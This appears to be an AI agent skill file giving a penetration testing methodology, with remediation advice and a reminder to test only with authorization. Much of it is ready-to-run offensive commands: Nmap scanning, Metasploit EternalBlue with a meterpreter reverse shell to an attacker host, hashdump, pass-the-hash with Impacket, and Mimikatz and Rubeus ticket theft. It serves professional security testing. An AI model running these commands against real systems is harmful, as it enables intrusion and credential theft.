---
name: network-penetration-testing
Description: Professional skills and methodologies for network penetration testing
version: 1.0.0
---

# Network penetration testing

## Overview

Network penetration testing is an important part of assessing the security of network infrastructure. This skill provides methods, tools and best practices for network penetration testing.

## Test scope

### 1. Information collection

**Check items:**
- Network topology
- Host discovery
- Port scan
- Service identification

### 2. Vulnerability Scanning

**Check items:**
- System vulnerabilities
- Service bugs
- Configuration error
- Weak password

### 3. Exploiting vulnerabilities

**Check items:**
- Remote code execution
- Privilege escalation
- Lateral movement
- Persistence

## Information collection

### Network Scan

**Using Nmap:**
```bash
# Host discovery
nmap -sn 192.168.1.0/24

# port scan
nmap -sS -p- 192.168.1.100

# Service identification
nmap -sV -sC 192.168.1.100

# Operating system identification
nmap -O 192.168.1.100

# Full scan
nmap -sS -sV -sC -O -p- 192.168.1.100
```

**Using Masscan:**
```bash
# Quick port scan
masscan -p1-65535 192.168.1.0/24 --rate=1000
```

### Service enumeration

**SMB enumeration:**
```bash
# Enumerate SMB shares
smbclient -L //192.168.1.100 -N

# Enumerate SMB users
enum4linux -U 192.168.1.100

# Use nmap script
nmap --script smb-enum-shares,smb-enum-users 192.168.1.100
```

**RPC enumeration:**
```bash
# Enumerate RPC services
rpcclient -U "" -N 192.168.1.100

# Use nmap script
nmap --script rpc-enum 192.168.1.100
```

**SNMP enumeration:**
```bash
# SNMP scan
snmpwalk -v2c -c public 192.168.1.100

# Use onesixtyone
onesixtyone -c wordlist.txt 192.168.1.0/24
```

## Vulnerability Scan

### Using Nessus

```bash
# Start Nessus
# Access the web interface
#Create scan task
# Analyze scan results
```

### Using OpenVAS

```bash
# Start OpenVAS
gvm-setup

# Access the web interface
#Create scan task
# Analyze scan results
```

### Using Nmap script

```bash
# Vulnerability scan
nmap --script vuln 192.168.1.100

#Specific vulnerability scan
nmap --script smb-vuln-ms17-010 192.168.1.100

# all scripts
nmap --script all 192.168.1.100
```

## Exploit

### Metasploit

**Basic usage:**
```bash
# Start Metasploit
msfconsole

# Search for vulnerabilities
search ms17-010

# Use modules
use exploit/windows/smb/ms17_010_eternalblue

# Set parameters
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444

# implement
exploit
```

**Post Penetration:**
```bash
# Get system information
sysinfo

# Get permission
getsystem

# Migration process
migrate <pid>

# Get the hash
hashdump

# Get password
run post/windows/gather/smart_hashdump
```

### Common vulnerability exploits

**EternalBlue：**
```bash
# Use Metasploit
use exploit/windows/smb/ms17_010_eternalblue

# Use standalone tools
python eternalblue.py 192.168.1.100
```

**BlueKeep：**
```bash
# Use Metasploit
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```

**SMBGhost：**
```bash
# Use standalone tools
python smbghost.py 192.168.1.100
```

## Lateral movement

### Password cracking

**Using Hashcat:**
```bash
# Crack NTLM hash
hashcat -m 1000 hashes.txt wordlist.txt

# Crack LM hash
hashcat -m 3000 hashes.txt wordlist.txt

# Usage rules
hashcat -m 1000 hashes.txt wordlist.txt -r rules/best64.rule
```

**Use John:**
```bash
# Crack the hash
john hashes.txt

# use dictionary
john --wordlist=wordlist.txt hashes.txt

# Usage rules
john --wordlist=wordlist.txt --rules hashes.txt
```

### Pass-the-Hash

**Use Impacket:**
```bash
# SMB Pass-the-Hash
python smbexec.py -hashes :<hash> domain/user@target

# WMI Pass-the-Hash
python wmiexec.py -hashes :<hash> domain/user@target

# RDP Pass-the-Hash
xfreerdp /u:user /pth:<hash> /v:target
```

### Ticket delivery

**Using Mimikatz:**
```bash
#Extract the ticket
sekurlsa::tickets /export

#Inject tickets
kerberos::ptt ticket.kirbi
```

**Using Rubeus:**
```bash
# Request a ticket
Rubeus.exe asktgt /user:user /domain:domain /rc4:hash

#Inject tickets
Rubeus.exe ptt /ticket:ticket.kirbi
```

## Tool usage

### Nmap

```bash
# Full scan
nmap -sS -sV -sC -O -p- -T4 target

# covert scan
nmap -sS -T2 -f -D RND:10 target

# UDP scan
nmap -sU -p- target
```

### Metasploit

```bash
# Start the framework
msfconsole

# Database initialization
msfdb init

#Import scan results
db_import nmap.xml

# View host
hosts

# View services
services
```

### Burp Suite

**Network Scanning:**
1. Configure the proxy
2. Browse the target network
3. Analyze traffic
4. Active scanning

## Test list

### Information collection
- [ ] Network topology discovery
- [ ] Host Discovery
- [ ] port scan
- [ ] Service Identification
- [ ] Operating system identification

### Vulnerability Scan
- [ ] System vulnerability scanning
- [ ] Service vulnerability scanning
- [ ] Configuration error checking
- [ ] Weak password check

### Exploit
- [ ] Remote code execution
- [ ] Privilege Elevation
- [ ] lateral movement
- [ ] persistence

## Common security issues

### 1. Unpatched system

**question:**
- The system is not updated in time
- There are known vulnerabilities
- Improper patch management

**repair:**
- Install patches promptly
- Establish patch management process
- Regular security updates

### 2. Weak password

**question:**
-Default password
- Simple password
- Password reuse

**repair:**
- Implement a strong password policy
- Enable multi-factor authentication
- Change your password regularly

### 3. Open port

**question:**
- Unnecessary port opening
- Service exposure
- Firewall configuration error

**repair:**
- Close unnecessary ports
- Implement firewall rules
- Access using VPN

### 4. Configuration error

**question:**
-Default configuration
- Excessive permissions
- Improper configuration of services

**repair:**
- Security configuration baseline
- Principle of least privilege
- Regular configuration review

## Best Practices

### 1. Information collection

- Full scan
- Multi-tool verification
- Document findings
- Analyze results

### 2. Exploiting vulnerabilities

- Authorization test
- minimal impact
- Record operations
- Clean up in time

### 3. Report writing

- Detailed records
- Risk rating
- Fix suggestions
- Verification steps

## Notes

- Test only in authorized environment
- Avoid impact on production systems
- Comply with laws and regulations
- Protect test data